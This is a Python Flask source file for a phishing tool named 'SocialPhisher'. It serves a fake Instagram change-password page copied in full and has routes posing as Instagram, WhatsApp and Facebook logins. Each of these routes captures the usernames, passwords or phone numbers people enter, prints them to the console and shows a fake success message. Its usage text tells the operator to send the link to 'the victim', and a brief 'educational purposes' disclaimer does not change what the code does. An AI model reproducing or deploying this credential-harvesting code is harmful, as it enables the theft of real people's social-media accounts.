from flask import Flask, render_template_string, request
import pyfiglet
from colorama import *
import time
import os

init()
ascii_art = pyfiglet.figlet_format("SocialPhisher")

definition = """
SocialPhisher
SocialPhisher is a phishing tool created by FRn13ds to simulate social engineering attacks using realistic phishing pages.
It supports multiple platforms and is intended for educational and ethical purposes only. Misuse for illegal activities is strictly prohibited.
"""

about ="""
Instructions:
First, the tool will provide you with a link that you need to open in your browser on your device.
Second, choose the social media platform you want to target your victim on.
Third, copy the link above and send it to the victim
"""

goodbye_msg = f"""
{ascii_art}
Thank you for using SocialPhisher! Stay safe and use responsibly.
Goodbye!
"""

app = Flask(__name__)

# Templates
templates = {
    'instagram': ''' ... ''',  # تم اختصاره هنا، ما يتبدلش
    'whatsapp': ''' ... ''',   # تم اختصاره هنا، ما يتبدلش
    'facebook': ''' ... ''',   # تم اختصاره هنا، ما يتبدلش
    'change_password': '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram • Change Password</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 350px;
      text-align: center;
    }
    img {
      width: 150px;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: gray;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
    <form action="/change-password" method="POST">
      <input type="password" name="old_password" placeholder="Old password" required />
      <input type="password" name="new_password" placeholder="New password" required />
      <input type="password" name="confirm_password" placeholder="Confirm new password" required />
      <button type="submit">Change Password</button>
    </form>
    <div class="footer">© 2025 Instagram from Meta</div>
  </div>
</body>
</html>
'''
}

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
<html>
<head>
    <title>Phishing Pages</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        a {
            text-decoration: none;
            color: #333;
            font-size: 24px;
            margin: 10px;
        }
        a:hover {
            color: #007bff;
        }
    </style>
</head>
<body>
    <h1>Welcome Dear User!</h1>
    <p style="font-family:monospace;">Please choose a social media platform:</p>
    <a href="/instagram"><i class="fab fa-instagram"></i> Instagram</a><br>
    <a href="/whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a><br>
    <a href="/facebook"><i class="fab fa-facebook"></i> Facebook</a><br>
    <a href="/change"><i class="fas fa-key"></i> Change Instagram Password</a><br>
</body>
</html>
    '''

@app.route('/instagram')
def instagram():
    return render_template_string(templates['instagram'])

@app.route('/whatsapp')
def whatsapp():
    return render_template_string(templates['whatsapp'])

@app.route('/facebook')
def facebook():
    return render_template_string(templates['facebook'])

@app.route('/change')
def change_password_page():
    return render_template_string(templates['change_password'])

@app.route('/change-password', methods=['POST'])
def handle_change_password():
    old = request.form['old_password']
    new = request.form['new_password']
    confirm = request.form['confirm_password']

    print(f"Password Change Attempt - Old: {old}, New: {new}, Confirm: {confirm}")

    return '''
    <html><body><h2>Password Updated!</h2><p>Thanks for updating your password.</p></body></html>
    '''

@app.route('/login/instagram', methods=['POST'])
def instagram_login():
    username = request.form['username']
    password = request.form['password']
    print(f"Instagram Login: {username}, {password}")
    return '<h2>Thank you! You have successfully logged in.</h2>'

@app.route('/login/whatsapp', methods=['POST'])
def whatsapp_login():
    phone = request.form['phone']
    print(f"WhatsApp Login: {phone}")
    return '<h2>Code sent to your number!</h2>'

@app.route('/login/facebook', methods=['POST'])
def facebook_login():
    email = request.form['email']
    password = request.form['password']
    print(f"Facebook Login: {email}, {password}")
    return '<h2>Facebook Login Complete!</h2>'

# Console Menu
if __name__ == '__main__':
    time.sleep(2)
    print(Fore.GREEN + ascii_art)
    print("                                           V0.2")
    print(Fore.RED + "Welcome Dear User !... ")
    enter = input(Style.RESET_ALL + "press any key to continue...")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.GREEN + ascii_art)
    print(Fore.BLUE + "[!] Welcome Again To This Tool ! ")
    
    def main():
        print(Back.MAGENTA + "MENU :", Style.RESET_ALL)
        print("[1] About The Tool ")
        print("[2] How To Use ")
        print("[3] Start ")
        print("[4] Exit")
        while True:
            choose = input(Fore.LIGHTCYAN_EX + "Select From Menu :")
            if choose == "1":
                print(Fore.GREEN + definition)
            elif choose == "2":
                print(Fore.RED + about)
            elif choose == "3":
                app.run(host='0.0.0.0', port=5000)
            elif choose == "4":
                print(Fore.CYAN + goodbye_msg)
                break
            else:
                print(Fore.RED + "Something went wrong, try again!")
    
    main()
